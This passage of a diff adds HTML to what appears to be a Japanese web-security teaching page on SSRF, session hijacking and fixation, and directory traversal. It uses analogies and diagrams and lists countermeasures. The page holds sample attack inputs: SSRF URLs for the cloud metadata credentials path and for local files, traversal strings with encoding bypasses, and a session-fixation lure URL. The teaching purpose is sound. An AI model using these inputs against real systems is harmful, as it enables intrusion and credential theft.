+            <div style="position:absolute;top:-10px;left:12px;background:#fff;padding:1px 8px;font-size:10px;font-weight:700;color:#5a1a9e;letter-spacing:.05em">社内ネットワーク</div>
+            <!-- FW (警備員) -->
+            <div style="flex:0 0 22px;background:repeating-linear-gradient(180deg,#fff8e6 0,#fff8e6 6px,#fde8a0 6px,#fde8a0 10px);border-left:2px solid #b5821e;border-right:2px solid #b5821e;display:flex;align-items:center;justify-content:center;padding:4px 0;position:relative">
+              <span style="writing-mode:vertical-rl;font-size:10.5px;font-weight:800;color:#7a4208;letter-spacing:.15em">FW 警備員</span>
+              <!-- 外部から直接FWを通ろうとする試み(ブロック) -->
+              <div style="position:absolute;top:50%;left:-28px;transform:translateY(-50%);display:flex;align-items:center;gap:2px">
+                <span style="color:#7a1818;font-size:11px;font-weight:900;text-decoration:line-through">直接</span>
+                <span style="color:#7a1818;font-size:13px;font-weight:900">✕</span>
+              </div>
+            </div>
+            <!-- Webアプリ(内部) -->
+            <div class="atk-node" style="flex:0 0 100px">
+              <div class="atk-icon webapp">
+                <svg width="34" height="34" viewBox="-18 -16 36 36" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M -14 16 Q -15 2 -4 0 L 4 0 Q 15 2 14 16 Z" fill="#eaf7f1" stroke="#155f44" stroke-width="1.3"/>
+                  <circle cx="0" cy="-8" r="7" fill="#eaf7f1" stroke="#155f44" stroke-width="1.3"/>
+                  <rect x="-8" y="-14" width="16" height="5" rx="0.5" fill="#155f44"/>
+                </svg>
+              </div>
+              <div class="atk-role webapp">Web アプリ<small>(社内通行証)</small></div>
+            </div>
+            <!-- ②内部アクセス -->
+            <div class="atk-arrowcol">
+              <div class="atk-arrow-pair">
+                <div class="atk-label success"><span class="atk-step-no success">2</span>社内として通過</div>
+                <div class="atk-payload success">GET http://localhost/admin</div>
+                <div class="atk-line success atk-arrow-r success"></div>
+              </div>
+              <div class="atk-arrow-pair">
+                <div class="atk-line dashed warn atk-arrow-l warn"></div>
+                <div class="atk-label warn"><span class="atk-step-no warn">3</span>機密データ取得</div>
+              </div>
+            </div>
+            <!-- 金庫(内部サーバ) -->
+            <div class="atk-node" style="flex:0 0 100px">
+              <div class="atk-icon db">
+                <svg width="36" height="36" viewBox="-18 -18 36 36" stroke-linecap="round" stroke-linejoin="round">
+                  <rect x="-14" y="-12" width="28" height="24" rx="3" fill="#ede8ff" stroke="#5a1a9e" stroke-width="1.4"/>
+                  <circle cx="0" cy="-2" r="7" fill="#fff" stroke="#5a1a9e" stroke-width="1.3"/>
+                  <circle cx="0" cy="-2" r="4" fill="#b8a0e0"/>
+                  <line x1="0" y1="-2" x2="0" y2="-6" stroke="#5a1a9e" stroke-width="1.3"/>
+                  <line x1="0" y1="-2" x2="3" y2="-2" stroke="#5a1a9e" stroke-width="1.3"/>
+                  <rect x="-11" y="7" width="22" height="4" rx="1" fill="#fde8e8" stroke="#7a1818" stroke-width="0.8"/>
+                </svg>
+              </div>
+              <div class="atk-role db">金庫<small>APIキー / 機密</small></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="atk-caption">Web アプリが FW 内側にあるため外部不可の社内リソースに到達できる。攻撃者はこれを踏み台にする (SSRF)</div>
+    </div>
+  </div>
+  <div class="detail-box examples">
+    <h4>具体的な攻撃例</h4>
+    <div class="detail-code">
+<span class="c">// 画像URLを受け取るAPIへの攻撃</span>
+<span class="c">// 通常の使い方</span>
+<span class="v">POST /fetch-image</span>
+<span class="v">{"url": "https://example.com/image.jpg"}</span>
+
+<span class="c">// SSRF攻撃：内部サービスへアクセス</span>
+<span class="ng">{"url": "http://localhost/admin"}</span>
+<span class="ng">{"url": "http://192.168.1.100/api/secret"}</span>
+
+<span class="c">// AWSクラウドメタデータ窃取（最重大）</span>
+<span class="ng">{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role"}</span>
+<span class="c">// → IAMクレデンシャル（Access Key + Secret Key）が取得される！</span>
+
+<span class="c">// ファイル読み取り（fileスキーム）</span>
+<span class="ng">{"url": "file:///etc/passwd"}</span>
+<span class="ng">{"url": "file:///var/www/html/.env"}</span>
+    </div>
+  </div>
+</div>
+
+<h3>対策</h3>
+<div class="steps">
+  <div class="step ok"><span class="sn" style="font-size:8px;width:52px;border-radius:3px;text-align:center">ホワイトリスト</span>
+    <div class="sb"><strong>アクセス先のホワイトリスト化：</strong>Webアプリからのリクエスト先を許可リストで厳格に制限。内部IPアドレス（169.254.x.x、10.x.x.x、172.16-31.x.x、192.168.x.x）へのアクセスをブロック。<code>file://</code>・<code>gopher://</code>等の危険スキームも禁止。</div>
+  </div>
+  <div class="step ok"><span class="sn" style="font-size:8px;width:52px;border-radius:3px;text-align:center">IMDSv2</span>
+    <div class="sb"><strong>クラウドメタデータ保護（AWS等）：</strong>IMDSv2（Instance Metadata Service v2）はPUTリクエストによるトークン取得が必要なため、SSRF経由での直接アクセスを防ぐ。クラウド環境での必須設定。</div>
+  </div>
+</div>
+</section>
+
+<!-- ================================================================ S07 セッション攻撃 ================================================================ -->
+<section class="section" id="s7">
+<div class="section-header"><span class="s-num red-bg">07</span><h2>セッションハイジャック・セッションフィクセーション</h2></div>
+<p>セッションIDを標的にした2つの攻撃。<strong>ハイジャック</strong>はセッションIDを盗む、<strong>フィクセーション</strong>はセッションIDを事前に固定する。</p>
+
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:14px 0">
+  <div style="border:2px solid var(--danger);border-radius:10px;overflow:hidden">
+    <div style="background:var(--danger);padding:10px 14px;display:flex;align-items:center;gap:8px">
+      <!-- ハイジャックアイコン -->
+      <svg width="32" height="32" viewBox="0 0 36 36" fill="none">
+        <rect x="2" y="2" width="32" height="32" rx="7" fill="rgba(255,255,255,.15)" stroke="white" stroke-width="1.2"/>
+        <!-- 鍵 -->
+        <circle cx="14" cy="15" r="5" fill="rgba(255,255,255,.2)" stroke="white" stroke-width="1.5"/>
+        <circle cx="14" cy="15" r="2.5" fill="rgba(255,255,255,.3)" stroke="white" stroke-width="1.2"/>
+        <rect x="17.5" y="14" width="10" height="3" rx="1.5" fill="rgba(255,255,255,.5)" stroke="white" stroke-width="1"/>
+        <rect x="24" y="17" width="3" height="2.5" rx="1" fill="rgba(255,255,255,.5)" stroke="white" stroke-width="1"/>
+        <rect x="20" y="17" width="3" height="2.5" rx="1" fill="rgba(255,255,255,.5)" stroke="white" stroke-width="1"/>
+        <!-- 手（盗む） -->
+        <path d="M8 24 Q12 20 20 22 Q26 23 28 26" stroke="white" stroke-width="1.5" fill="none"/>
+        <path d="M28 26 L24 24" stroke="white" stroke-width="1.5"/>
+      </svg>
+      <div><div style="font-size:13px;font-weight:800;color:white;font-family:var(--mono)">セッションハイジャック</div><div style="font-size:9.5px;color:rgba(255,255,255,.75)">認証後 → セッションIDを盗む</div></div>
+    </div>
+    <div style="padding:14px;background:#fff5f5">
+      <p style="font-size:12.5px;color:#3a3d52;line-height:1.65;margin-bottom:10px">たとえ話：ホテルにチェックイン後に<b>部屋カードをスリに盗まれる</b>。盗んだカードを使えば部屋（アカウント）に入り放題。</p>
+      <!-- ハイジャック イラスト -->
+      <div class="atk-scene" style="padding:18px 14px 12px">
+        <div class="atk-scene-inner">
+          <!-- 上段: 被害者の正常ログイン -->
+          <div class="atk-lane" style="padding-bottom:16px;margin-bottom:16px;border-bottom:1px dashed #ddd">
+            <div class="atk-node">
+              <div class="atk-icon victim">
+                <svg width="38" height="38" viewBox="-18 -15 36 36" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M -14 16 Q -15 2 -4 0 L 4 0 Q 15 2 14 16 Z" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                  <circle cx="0" cy="-8" r="8" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                </svg>
+              </div>
+              <div class="atk-role victim">被害者</div>
+            </div>
+            <div class="atk-arrowcol">
+              <div class="atk-arrow-pair">
+                <div class="atk-label info"><span class="atk-step-no info">1</span>ログイン(ID/PW)</div>
+                <div class="atk-line info atk-arrow-r info"></div>
+              </div>
+              <div class="atk-arrow-pair">
+                <div class="atk-line warn atk-arrow-l warn"></div>
+                <div class="atk-label warn"><span class="atk-step-no warn">2</span>セッションID(カード)発行</div>
+                <div class="atk-payload warn">SID: X7K9a2</div>
+              </div>
+            </div>
+            <div class="atk-node">
+              <div class="atk-icon server">
+                <svg width="38" height="38" viewBox="-20 -20 40 40" stroke-linecap="round" stroke-linejoin="round">
+                  <rect x="-17" y="-16" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                  <rect x="-17" y="-4" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                  <rect x="-17" y="8" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                  <circle cx="-12" cy="-11" r="1.3" fill="#b5821e"/>
+                  <circle cx="-12" cy="1" r="1.3" fill="#b5821e"/>
+                  <circle cx="-12" cy="13" r="1.3" fill="#b5821e"/>
+                  <line x1="-7" y1="-11" x2="13" y2="-11" stroke="#b5821e" stroke-width="1"/>
+                  <line x1="-7" y1="1" x2="13" y2="1" stroke="#b5821e" stroke-width="1"/>
+                  <line x1="-7" y1="13" x2="13" y2="13" stroke="#b5821e" stroke-width="1"/>
+                </svg>
+              </div>
+              <div class="atk-role server">ホテルフロント<small>(サーバ)</small></div>
+            </div>
+          </div>
+          <!-- 下段: 攻撃者の窃取・成済まし -->
+          <div class="atk-lane">
+            <div class="atk-node">
+              <div class="atk-icon attacker">
+                <svg width="38" height="38" viewBox="-16 -20 32 38" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M -14 14 L 14 14 L 13 17 L -13 17 Z" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                  <rect x="-12" y="5" width="24" height="9" rx="1" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                  <text x="0" y="12" text-anchor="middle" font-size="6" fill="#7a1818" font-family="monospace">&lt;/&gt;</text>
+                  <path d="M -10 5 Q -12 -1 -4 -2 L 4 -2 Q 12 -1 10 5" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                  <circle cx="0" cy="-9" r="7" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                  <path d="M -5 -14 L -6 -20 Q -3 -17 -3 -15 Z" fill="#7a1818"/>
+                  <path d="M 5 -14 L 6 -20 Q 3 -17 3 -15 Z" fill="#7a1818"/>
+                  <rect x="-6" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                  <rect x="1.5" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                  <line x1="-1.5" y1="-9.7" x2="1.5" y2="-9.7" stroke="#7a1818" stroke-width="0.9"/>
+                  <path d="M -3 -6 Q 0 -4 3 -6" fill="none" stroke="#7a1818" stroke-width="1.1"/>
+                  <path d="M -1.5 -6 L -1 -4.5 L -0.5 -6 Z" fill="#7a1818"/>
+                  <path d="M 0.5 -6 L 1 -4.5 L 1.5 -6 Z" fill="#7a1818"/>
+                </svg>
+              </div>
+              <div class="atk-role attacker">攻撃者 (スリ)</div>
+            </div>
+            <div class="atk-arrowcol">
+              <div class="atk-arrow-pair">
+                <div class="atk-label danger"><span class="atk-step-no danger">3</span>カード窃取(XSS/盗聴/PC乗取り)</div>
+                <div class="atk-line dashed danger atk-arrow-l danger"></div>
+                <div class="atk-payload danger">盗んだ SID: X7K9a2</div>
+              </div>
+            </div>
+            <div class="atk-arrowcol">
+              <div class="atk-arrow-pair">
+                <div class="atk-label danger"><span class="atk-step-no danger">4</span>同じIDで成済まし</div>
+                <div class="atk-line danger atk-arrow-r danger"></div>
+                <div class="atk-payload danger">Cookie: SID=X7K9a2</div>
+              </div>
+            </div>
+            <div class="atk-node">
+              <div class="atk-icon server" style="position:relative">
+                <svg width="38" height="38" viewBox="-20 -20 40 40" stroke-linecap="round" stroke-linejoin="round">
+                  <rect x="-17" y="-16" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                  <rect x="-17" y="-4" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                  <rect x="-17" y="8" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                  <circle cx="-12" cy="-11" r="1.3" fill="#b5821e"/>
+                  <circle cx="-12" cy="1" r="1.3" fill="#b5821e"/>
+                  <circle cx="-12" cy="13" r="1.3" fill="#b5821e"/>
+                </svg>
+                <span style="position:absolute;top:-6px;right:-6px" class="atk-excl" title="同IDなら本人と誤認">!</span>
+              </div>
+              <div class="atk-role server">同じフロント<small>本人と誤認</small></div>
+            </div>
+          </div>
+        </div>
+        <div class="atk-caption">サーバは「セッションIDが同じなら本人」と判定する → 盗まれたカードで攻撃者が入室できてしまう</div>
+      </div>
+      <div class="detail-code" style="margin:0">
+<span class="c">// Cookie窃取（XSS経由）</span>
+<span class="ng">document.cookie</span> <span class="c">→ "session=abc123def"</span>
+<span class="c">// 攻撃者がこのsession値をブラウザのCookieにセット</span>
+<span class="c">// → 被害者として認証された状態になる</span>
+
+<span class="c">// パケット盗聴（非HTTPS）</span>
+<span class="c">// Cookie: session=abc123def がネットワーク上を平文で流れる</span>
+<span class="c">// Wiresharkなどで容易に取得可能</span>
+      </div>
+      <div style="margin-top:8px;display:flex;flex-wrap:wrap;gap:4px">
+        <span class="counter-tag">HttpOnly Cookie（JS読み取り禁止）</span>
+        <span class="counter-tag">HTTPS（通信暗号化）</span>
+        <span class="counter-tag">Secure Cookie属性</span>
+      </div>
+    </div>
+  </div>
+
+  <div style="border:2px solid var(--warn);border-radius:10px;overflow:hidden">
+    <div style="background:var(--warn);padding:10px 14px;display:flex;align-items:center;gap:8px">
+      <!-- フィクセーションアイコン -->
+      <svg width="32" height="32" viewBox="0 0 36 36" fill="none">
+        <rect x="2" y="2" width="32" height="32" rx="7" fill="rgba(255,255,255,.15)" stroke="white" stroke-width="1.2"/>
+        <!-- 攻撃者が先に鍵を差し込む -->
+        <rect x="12" y="10" width="14" height="10" rx="2.5" fill="rgba(255,255,255,.2)" stroke="white" stroke-width="1.4"/>
+        <circle cx="19" cy="15" r="2.5" fill="rgba(255,255,255,.3)" stroke="white" stroke-width="1.2"/>
+        <rect x="18" y="17" width="2" height="4" rx="1" fill="rgba(255,255,255,.5)"/>
+        <!-- 矢印（事前に差す） -->
+        <path d="M6 24 L12 24" stroke="white" stroke-width="1.8"/>
+        <path d="M10 21 L13 24 L10 27" stroke="white" stroke-width="1.5" fill="none"/>
+        <!-- コピー矢印（後で使う） -->
+        <path d="M28 14 Q32 18 28 22" stroke="rgba(255,200,100,.8)" stroke-width="1.5" fill="none"/>
+        <circle cx="28" cy="14" r="2" fill="rgba(255,200,100,.6)" stroke="white" stroke-width="1"/>
+        <circle cx="28" cy="22" r="2" fill="rgba(255,200,100,.6)" stroke="white" stroke-width="1"/>
+      </svg>
+      <div><div style="font-size:13px;font-weight:800;color:white;font-family:var(--mono)">セッションフィクセーション</div><div style="font-size:9.5px;color:rgba(255,255,255,.75)">認証前 → セッションIDを固定させる</div></div>
+    </div>
+    <div style="padding:14px;background:#fffaf0">
+      <p style="font-size:12.5px;color:#3a3d52;line-height:1.65;margin-bottom:10px">たとえ話：攻撃者が<b>偽のホテルカード（既知のセッションID）を先にゲストに渡す</b>。ゲストがそのカードでチェックインすると、攻撃者も同じカードで入室できるようになる。</p>
+      <!-- フィクセーション イラスト -->
+      <div class="atk-scene" style="padding:18px 14px 12px">
+        <div class="atk-scene-inner">
+          <div class="atk-lane">
+            <!-- 攻撃者 -->
+            <div class="atk-node">
+              <div class="atk-icon attacker">
+                <svg width="38" height="38" viewBox="-16 -20 32 38" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M -14 14 L 14 14 L 13 17 L -13 17 Z" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                  <rect x="-12" y="5" width="24" height="9" rx="1" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                  <text x="0" y="12" text-anchor="middle" font-size="6" fill="#7a1818" font-family="monospace">&lt;/&gt;</text>
+                  <path d="M -10 5 Q -12 -1 -4 -2 L 4 -2 Q 12 -1 10 5" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                  <circle cx="0" cy="-9" r="7" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                  <path d="M -5 -14 L -6 -20 Q -3 -17 -3 -15 Z" fill="#7a1818"/>
+                  <path d="M 5 -14 L 6 -20 Q 3 -17 3 -15 Z" fill="#7a1818"/>
+                  <rect x="-6" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                  <rect x="1.5" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                  <line x1="-1.5" y1="-9.7" x2="1.5" y2="-9.7" stroke="#7a1818" stroke-width="0.9"/>
+                  <path d="M -3 -6 Q 0 -4 3 -6" fill="none" stroke="#7a1818" stroke-width="1.1"/>
+                  <path d="M -1.5 -6 L -1 -4.5 L -0.5 -6 Z" fill="#7a1818"/>
+                  <path d="M 0.5 -6 L 1 -4.5 L 1.5 -6 Z" fill="#7a1818"/>
+                </svg>
+              </div>
+              <div class="atk-role attacker">攻撃者<small>既知SIDを保持</small></div>
+            </div>
+            <!-- ①罠URLで固定IDを配る -->
+            <div class="atk-arrowcol">
+              <div class="atk-arrow-pair">
+                <div class="atk-label danger"><span class="atk-step-no danger">1</span>固定IDを仕込んだ罠URL誘導</div>
+                <div class="atk-payload danger">/login?sid=FIXED123</div>
+                <div class="atk-line danger atk-arrow-r danger"></div>
+              </div>
+            </div>
+            <!-- 被害者 -->
+            <div class="atk-node">
+              <div class="atk-icon victim">
+                <svg width="38" height="38" viewBox="-18 -15 36 36" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M -14 16 Q -15 2 -4 0 L 4 0 Q 15 2 14 16 Z" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                  <circle cx="0" cy="-8" r="8" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                </svg>
+              </div>
+              <div class="atk-role victim">被害者<small>同SIDで認証</small></div>
+            </div>
+            <!-- ②同IDでログイン -->
+            <div class="atk-arrowcol">
+              <div class="atk-arrow-pair">
+                <div class="atk-label info"><span class="atk-step-no info">2</span>固定SIDのままログイン成功</div>
+                <div class="atk-payload info">Cookie: SID=FIXED123</div>
+                <div class="atk-line info atk-arrow-r info"></div>
+              </div>
+            </div>
+            <!-- サーバ -->
+            <div class="atk-node">
+              <div class="atk-icon server" style="position:relative">
+                <svg width="38" height="38" viewBox="-20 -20 40 40" stroke-linecap="round" stroke-linejoin="round">
+                  <rect x="-17" y="-16" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                  <rect x="-17" y="-4" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                  <rect x="-17" y="8" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                  <circle cx="-12" cy="-11" r="1.3" fill="#b5821e"/>
+                  <circle cx="-12" cy="1" r="1.3" fill="#b5821e"/>
+                  <circle cx="-12" cy="13" r="1.3" fill="#b5821e"/>
+                </svg>
+                <span style="position:absolute;top:-6px;right:-6px" class="atk-excl" title="ログイン時にSID再生成していない">!</span>
+              </div>
+              <div class="atk-role server">サーバ<small>SID再生成なし</small></div>
+            </div>
+          </div>
+          <div class="atk-note danger" style="margin-top:14px">
+            <span class="atk-step-no danger" style="margin-top:1px">3</span>
+            <div><strong>攻撃者も同じSIDを保持 →</strong> 認証後の被害者セッションにそのまま入室できる。<strong>根本対策は「ログイン時に必ずSID再生成」</strong>（<code>session_regenerate_id(true)</code> 等）。</div>
+          </div>
+        </div>
+        <div class="atk-caption">ログイン前後でSIDを再生成しないと、事前配布したSIDで攻撃者も認証済セッションに乗れる (Session Fixation)</div>
+      </div>
+      <div class="detail-code" style="margin:0">
+<span class="c">// ①攻撃者がセッションIDを取得</span>
+<span class="v">GET /login → Set-Cookie: session=FIXED123</span>
+
+<span class="c">// ②ユーザにセッションIDを含むURLを踏ませる</span>
+<span class="ng">https://bank.jp/login?session=FIXED123</span>
+
+<span class="c">// ③ユーザがFIXED123のままログイン</span>
+<span class="c">// ④攻撃者がFIXED123を使うと認証済みとして扱われる</span>
+      </div>
+      <div style="margin-top:8px;display:flex;flex-wrap:wrap;gap:4px">
+        <span class="counter-tag" style="background:#fff3d0;border-color:#e0c070;color:#7a4208">ログイン時にセッションID再生成（根本対策）</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+</section>
+
+<!-- ================================================================ S08 ディレクトリトラバーサル ================================================================ -->
+<section class="section" id="s8">
+<div class="section-header"><span class="s-num gold-bg">08</span><h2>ディレクトリトラバーサル</h2></div>
+<p><code>../</code>（親ディレクトリ参照）を使いWebルート外のファイルに不正アクセスする攻撃。<code>/etc/passwd</code>や設定ファイルの漏洩が代表的な被害。</p>
+
+<div class="detail-grid" style="padding:0;gap:14px">
+  <div class="detail-box analogy">
+    <h4>たとえ話</h4>
+    <p>ショッピングモールの1階（/images/）は公開ゾーン。「../ = 1フロア上へ」という特殊な階段を使い、「<code>../../事務室/鍵リスト</code>（/etc/passwd）」まで遡ることができる。セキュリティの想定は「1階だけ」だったため、事務室のドアに鍵がかかっていない。</p>
+    <!-- ディレクトリトラバーサル イラスト: 階層構造 + ../ 階段 -->
+    <div class="atk-scene">
+      <div class="atk-scene-inner">
+        <div class="atk-lane">
+          <!-- 攻撃者 -->
+          <div class="atk-node">
+            <div class="atk-icon attacker">
+              <svg width="38" height="38" viewBox="-16 -20 32 38" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M -14 14 L 14 14 L 13 17 L -13 17 Z" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <rect x="-12" y="5" width="24" height="9" rx="1" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <text x="0" y="12" text-anchor="middle" font-size="6" fill="#7a1818" font-family="monospace">&lt;/&gt;</text>
+                <path d="M -10 5 Q -12 -1 -4 -2 L 4 -2 Q 12 -1 10 5" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <circle cx="0" cy="-9" r="7" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <path d="M -5 -14 L -6 -20 Q -3 -17 -3 -15 Z" fill="#7a1818"/>
+                <path d="M 5 -14 L 6 -20 Q 3 -17 3 -15 Z" fill="#7a1818"/>
+                <rect x="-6" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <rect x="1.5" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <line x1="-1.5" y1="-9.7" x2="1.5" y2="-9.7" stroke="#7a1818" stroke-width="0.9"/>
+                <path d="M -3 -6 Q 0 -4 3 -6" fill="none" stroke="#7a1818" stroke-width="1.1"/>
+                <path d="M -1.5 -6 L -1 -4.5 L -0.5 -6 Z" fill="#7a1818"/>
+                <path d="M 0.5 -6 L 1 -4.5 L 1.5 -6 Z" fill="#7a1818"/>
+              </svg>
+            </div>
+            <div class="atk-role attacker">攻撃者</div>
+          </div>
+          <!-- ①パラメータ -->
+          <div class="atk-arrowcol">
+            <div class="atk-arrow-pair">
+              <div class="atk-label danger"><span class="atk-step-no danger">1</span><code>../</code>連結の攻撃URL</div>
+              <div class="atk-payload danger">?f=../../etc/passwd</div>
+              <div class="atk-line danger atk-arrow-r danger"></div>
+            </div>
+          </div>
+          <!-- 建物フロア図 -->
+          <div class="atk-building">
+            <div class="atk-floor secret">
+              <div class="atk-floor-label">3F 役員室</div>
+              <div class="atk-floor-path">/etc/</div>
+              <div class="atk-floor-items">
+                <span class="atk-floor-item">passwd</span>
+                <span class="atk-floor-item">shadow</span>
+              </div>
+              <span class="atk-excl" style="position:absolute;top:-8px;right:-8px">!</span>
+            </div>
+            <div class="atk-floor middle">
+              <div class="atk-floor-label">2F 管理室</div>
+              <div class="atk-floor-path">/var/config/</div>
+              <div class="atk-floor-items"><span class="atk-floor-item">app.ini</span></div>
+            </div>
+            <div class="atk-floor public">
+              <div class="atk-floor-label">1F 公開エリア</div>
+              <div class="atk-floor-path">/var/www/images/</div>
+              <div class="atk-floor-items">
+                <span class="atk-floor-item">photo.jpg</span>
+                <span class="atk-floor-item">logo.png</span>
+              </div>
+            </div>
+            <div style="display:flex;align-items:center;gap:8px;margin-top:6px;font-size:10.5px;color:#7a1818;font-weight:600;padding:0 4px">
+              <span style="font-family:var(--mono);font-size:12px;background:#fde8e8;border:1px solid #e08080;padding:2px 6px;border-radius:3px">../ ../</span>
+              <span>→ 公開エリアから役員室まで遡れる (想定:1Fだけ公開)</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="atk-caption">入力されたパスをそのままファイル取得に使うため、<code>../</code>で公開外の機密ファイルまで辿られる</div>
+    </div>
+  </div>
+  <div class="detail-box examples">
+    <h4>攻撃例（様々なエンコード）</h4>
+    <div class="detail-code">
+<span class="c">// 基本形</span>
+<span class="ng">GET /viewfile?name=../../../../etc/passwd</span>
+
+<span class="c">// URLエンコードを使ったフィルタ迂回</span>
+<span class="ng">GET /viewfile?name=..%2F..%2F..%2Fetc%2Fpasswd</span>
+<span class="c">// %2F = /  %2E = .</span>
+
+<span class="c">// ダブルエンコード（フィルタ迂回）</span>
+<span class="ng">GET /viewfile?name=..%252F..%252Fetc%252Fpasswd</span>
+<span class="c">// %25 = % → %2F = /（二重デコード）</span>
+
+<span class="c">// Windowsのバックスラッシュ（IIS等）</span>
+<span class="ng">GET /viewfile?name=..\..\..\..\Windows\win.ini</span>
+
+<span class="c">// サーバ内部での解釈</span>
+<span class="c">// /var/www/html/images/../../../../etc/passwd</span>
+<span class="c">// = /etc/passwd → root権限情報が漏洩！</span>
+    </div>
+  </div>
+</div>
+
+<h3>対策</h3>
+<div class="steps">
+  <div class="step ok"><span class="sn" style="font-size:8px;width:48px;border-radius:3px;text-align:center">パス正規化</span>
+    <div class="sb"><strong>パスの正規化と検証：</strong><code>realpath()</code>等でパスを正規化してから、許可されたベースディレクトリ内に収まるかを確認する。
+    <div class="detail-code" style="margin:6px 0 0">
+<span class="c">// PHP での安全な実装</span>
+<span class="v">$base = '/var/www/html/images/';</span>
+<span class="ok">$realPath = realpath</span>(<span class="v">$base . $userInput</span>);
+<span class="k">if</span> (<span class="v">strpos($realPath, $base) !== 0</span>) {
+  <span class="ng">die('不正なパス');</span>  <span class="c">// ベースディレクトリ外は拒否</span>
+}
+    </div></div>
+  </div>
+  <div class="step ok"><span class="sn" style="font-size:8px;width:48px;border-radius:3px;text-align:center">間接参照</span>
+    <div class="sb"><strong>ファイル名の間接参照：</strong>ユーザにファイル名を直接指定させず、数字IDとファイルのマッピングをサーバ側で管理する（<code>?id=3</code>→<code>image3.jpg</code>）。そもそもパス操作が不要な設計にする。</div>
+  </div>
+</div>
+</section>
+
+<!-- ================================================================ S09 OSコマンドインジェクション ================================================================ -->
+<section class="section" id="s9">
+<div class="section-header"><span class="s-num red-bg">09</span><h2>OSコマンドインジェクション</h2></div>
+<p>シェルの特殊文字を入力に混入し、Webサーバの権限で<strong>任意のOSコマンドを実行</strong>させる攻撃。SQLiよりも直接的でサーバへの影響が甚大。</p>
+
+<div class="detail-grid" style="padding:0;gap:14px">
+  <div class="detail-box analogy">
+    <h4>たとえ話</h4>
+    <p>工場の管理端末（Webアプリ）が「どの在庫を確認しますか？」と聞く。通常「りんご」と答えると「<code>在庫確認 りんご</code>」という命令が実行される。攻撃者が「<b>りんご; 全設備を停止せよ</b>」と入力すると「<code>在庫確認 りんご</code>」と「<code>全設備停止</code>」の両方が実行される。</p>
+    <!-- OSコマンドi イラスト: 工場端末 + 2命令連続実行 -->
+    <div class="atk-scene">
+      <div class="atk-scene-inner">
+        <div class="atk-lane">
+          <!-- 攻撃者 -->
+          <div class="atk-node">
+            <div class="atk-icon attacker">
+              <svg width="38" height="38" viewBox="-16 -20 32 38" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M -14 14 L 14 14 L 13 17 L -13 17 Z" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <rect x="-12" y="5" width="24" height="9" rx="1" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <text x="0" y="12" text-anchor="middle" font-size="6" fill="#7a1818" font-family="monospace">&lt;/&gt;</text>
+                <path d="M -10 5 Q -12 -1 -4 -2 L 4 -2 Q 12 -1 10 5" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <circle cx="0" cy="-9" r="7" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <path d="M -5 -14 L -6 -20 Q -3 -17 -3 -15 Z" fill="#7a1818"/>
+                <path d="M 5 -14 L 6 -20 Q 3 -17 3 -15 Z" fill="#7a1818"/>
+                <rect x="-6" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <rect x="1.5" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <line x1="-1.5" y1="-9.7" x2="1.5" y2="-9.7" stroke="#7a1818" stroke-width="0.9"/>
+                <path d="M -3 -6 Q 0 -4 3 -6" fill="none" stroke="#7a1818" stroke-width="1.1"/>
+                <path d="M -1.5 -6 L -1 -4.5 L -0.5 -6 Z" fill="#7a1818"/>
+                <path d="M 0.5 -6 L 1 -4.5 L 1.5 -6 Z" fill="#7a1818"/>
